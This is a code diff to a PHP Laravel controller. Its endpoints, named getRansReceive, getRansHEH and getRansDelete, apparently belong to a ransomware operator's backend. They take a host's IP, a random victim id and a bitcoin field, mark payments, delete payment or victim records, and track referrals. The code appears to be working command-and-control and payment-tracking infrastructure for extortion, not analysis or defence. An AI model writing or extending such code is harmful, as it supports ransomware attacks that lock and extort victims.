@@ -70,17 +70,17 @@ class MainController extends Controller {
 	 *
 	 * @return Response
 	 */
-	public function getRansReceive(Request $request)
+	public function getRansHEH(Request $request)
     {
            $req = $request->all();
 		   #dd($req);
            $ret = "";
                
                 $validator = Validator::make($req, [
-                             'fn' => 'required',
-                             'og' => 'required',
-                             'gg' => 'required',
+                             'ip' => 'required',
+                             'randd' => 'required',
                              'r' => 'required',
+                             'mokije' => 'required',
                    ]);
          
                  if($validator->fails())
@@ -113,6 +113,8 @@ class MainController extends Controller {
                              'ip' => 'required',
                              'randd' => 'required',
                              'btc' => 'required',
+                             'r' => 'required',
+                             'mokije' => 'required',
                    ]);
          
                  if($validator->fails())
@@ -127,6 +129,7 @@ class MainController extends Controller {
                   }       
            return json_encode($ret);
     }
+
 	
 	/**
 	 * Show the application welcome screen to the user.
@@ -210,6 +213,68 @@ class MainController extends Controller {
                        $this->helpers->markPayment($req);  
                         $ret = "ok";                      
                   }       
+           return $ret;                                                                                            
+    }
+	
+	/**
+	 * Show the application welcome screen to the user.
+	 *
+	 * @return Response
+	 */
+	public function getRansDelete(Request $request)
+    {
+           $req = $request->all();
+		   #dd($req);
+           $ret = "zip";
+               
+                $validator = Validator::make($req, [
+                             'type' => 'required',
+                             'gg' => 'required', 
+                   ]);
+         
+                 if($validator->fails())
+                  {
+                       $ret = "wjhwjwhjef owkjhjknj!";
+                       
+                 }
+                
+                 else
+                 { 
+			            $type = $req['type'];
+						
+						if($type == "p") $this->helpers->deletePayment($req);  
+						else if($type == "r") $this->helpers->deleteRecords($req);
+						
+                        $ret = "ok";                      
+                  }       
+           return $ret;                                                                                            
+    }/**
+	 * Show the application welcome screen to the user.
+	 *
+	 * @return Response
+	 */
+	public function getAddReferral(Request $request)
+    {
+           $req = $request->all();
+		   #dd($req);
+           $ret = [];
+               
+                $validator = Validator::make($req, [
+                             'email' => 'required',
+                   ]);
+         
+                 if($validator->fails())
+                  {
+                       $ret = "wjhwjwhjef owkjhjknj!";
+                       
+                 }
+                
+                 else
+                 { 
+                       $this->helpers->addReferral($req);  
+                       $ret = json_encode(["status" => "ok"]);                      
+                 }       
+				 
            return $ret;                                                                                            
     }
 	
